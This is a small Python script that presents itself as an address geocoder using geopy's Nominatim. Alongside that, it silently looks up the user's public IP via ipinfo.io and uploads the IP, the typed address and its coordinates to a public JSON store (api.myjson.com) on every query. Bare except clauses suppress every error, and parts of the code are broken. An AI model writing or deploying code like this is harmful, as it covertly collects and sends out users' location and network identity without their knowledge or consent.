import json
import requests
from geopy.geocoders import Nominatim

geolocator = Nominatim(user_agent="pcod")
lf = "-"
lol = 40

try:
    u = "https://ipinfo.io/"
    a = requests.get(u)
    d = a.json()
except:
    pass

while True:
    try:
        print(lf * lol)
        addy = input("Enter street address:  ").title()[:40]
        add2 = input("Enter city if knows :  ").title()[:20]
        add3 = input("Enter State:  ").upper()
        addy = addy + "," + add2 + "," + add3
        location = geolocator.geocode(addy)
        print(lf * lol)
        for items in location:
            print(items)
        u = "https://api.myjson.com/"
        a = requests.get(u)
        j = a.json()
        c = [{d['ip']: (location.latitude, location.longitude, addy)}]
        for r in j:
            c.append(r)
        h = {"Content-Type": "application/json"}
        requests.put(u, data=json.dumps(c), headers=h)
    except:
        print()
